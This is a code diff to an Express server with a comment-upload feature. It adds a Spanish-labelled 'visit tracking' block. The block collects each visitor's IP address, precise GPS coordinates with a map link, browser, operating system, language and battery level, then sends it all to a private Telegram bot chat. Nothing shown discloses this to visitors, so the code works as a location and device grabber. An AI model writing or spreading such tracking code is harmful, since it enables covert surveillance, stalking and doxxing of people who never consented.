@@ -130,6 +130,105 @@ app.post("/comentario", upload.array("fotos", 5), async (req, res) => {
     }
 });
 
+
+
+
+// =======================
+// TRACKING DE VISITAS - DICIEMBRE 2025
+// =======================
+
+let visitaTemporal = null;
+
+// Recibe datos del dispositivo (ajax.js)
+app.post("/recibe-info", (req, res) => {
+    try {
+        const { agent = '', dystro = '', idioma = '', bateri = 'N/A' } = req.body;
+
+        // Detección navegador (igual que tu PHP antiguo)
+        let navegador = "Desconocido";
+        if (agent.includes("Brave")) navegador = agent.match(/Brave\/([0-9.]+)/) ? `Brave ${RegExp.$1}` : "Brave";
+        else if (agent.includes("Edg")) navegador = `Edge ${agent.match(/Edg\/([0-9.]+)/)?.[1] || ""}`;
+        else if (agent.includes("OPR") || agent.includes("Opera")) navegador = `Opera ${agent.match(/OPR\/([0-9.]+)/)?.[1] || ""}`;
+        else if (agent.includes("Firefox")) navegador = `Firefox ${agent.match(/Firefox\/([0-9.]+)/)?.[1] || ""}`;
+        else if (agent.includes("Safari") && !agent.includes("Chrome")) navegador = `Safari ${agent.match(/Version\/([0-9.]+)/)?.[1] || ""}`;
+        else if (agent.includes("Chrome")) navegador = `Chrome ${agent.match(/Chrome\/([0-9.]+)/)?.[1] || ""}`;
+
+        // Sistema operativo
+        let sistema = agent.includes("Windows NT 10") ? "Windows 10" :
+                      agent.includes("Windows NT 6.3") ? "Windows 8.1" :
+                      agent.includes("Windows NT 6.1") ? "Windows 7" :
+                      agent.includes("Android") ? "Android" :
+                      (agent.includes("iPhone") || agent.includes("iPad")) ? "iOS" :
+                      agent.includes("Linux") ? "Linux" : "Desconocido";
+
+        let arquitectura = dystro.includes("armv7") ? " (32 bits)" :
+                          dystro.includes("armv8") || dystro.includes("aarch64") ? " (64 bits)" : " (64 bits)";
+
+        let idiomaTexto = idioma === "es-MX" ? "Español (México)" :
+                         idioma === "es-ES" ? "Español (España)" :
+                         idioma === "en-US" ? "Inglés (EE.UU)" : idioma || "Desconocido";
+
+        let bateriaTexto = bateri !== 'N/A' ? `${bateri}%` : "Desconocido";
+
+        visitaTemporal = {
+            navegador, sistema: `${sistema}${arquitectura}`, idioma: idiomaTexto, bateria: bateriaTexto, agent: agent.substring(0,150)
+        };
+
+        res.json({ status: 'ok' });
+    } catch (err) {
+        res.status(500).json({ error: "Error" });
+    }
+});
+
+// Recibe ubicación y envía TODO a Telegram
+app.post("/location", async (req, res) => {
+    try {
+        const { latitude, longitude, accuracy } = req.body;
+        const ip = req.headers['x-forwarded-for']?.split(',')[0].trim() || req.socket.remoteAddress || 'Unknown';
+        const hora = new Date().toLocaleString('es-VE', { timeZone: 'America/Caracas' });
+
+        let msg = "📍 <b>NUEVA VISITA</b>\n\n";
+        msg += `🌐 IP: ${ip}\n\n`;
+
+        if (latitude && longitude) {
+            msg += `📌 Lat: ${latitude}\n📌 Lon: ${longitude}\n🎯 Precisión: ${accuracy ? Math.round(accuracy) + 'm' : 'N/A'}\n`;
+            msg += `🌍 <a href="https://maps.google.com/?q=${latitude},${longitude}">Ver mapa</a>\n\n`;
+        } else {
+            msg += "❌ Ubicación bloqueada\n\n";
+        }
+
+        msg += "<b>Dispositivo:</b>\n";
+        if (visitaTemporal) {
+            msg += `- Navegador: ${visitaTemporal.navegador}\n`;
+            msg += `- SO: ${visitaTemporal.sistema}\n`;
+            msg += `- Idioma: ${visitaTemporal.idioma}\n`;
+            msg += `- Batería: ${visitaTemporal.bateria}\n`;
+            msg += `- UA: ${visitaTemporal.agent}\n`;
+        } else {
+            msg += "Sin datos del dispositivo\n";
+        }
+
+        msg += `\n⏰ Hora VZLA: ${hora}`;
+
+        await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: process.env.TELEGRAM_CHAT_ID,
+                text: msg,
+                parse_mode: 'HTML',
+                disable_web_page_preview: true
+            })
+        });
+
+        visitaTemporal = null; // limpiar
+        res.json({ status: 'logged' });
+    } catch (err) {
+        res.status(500).json({ error: "Error" });
+    }
+});
+
+
 // =======================
 // INICIAR SERVIDOR
 // =======================
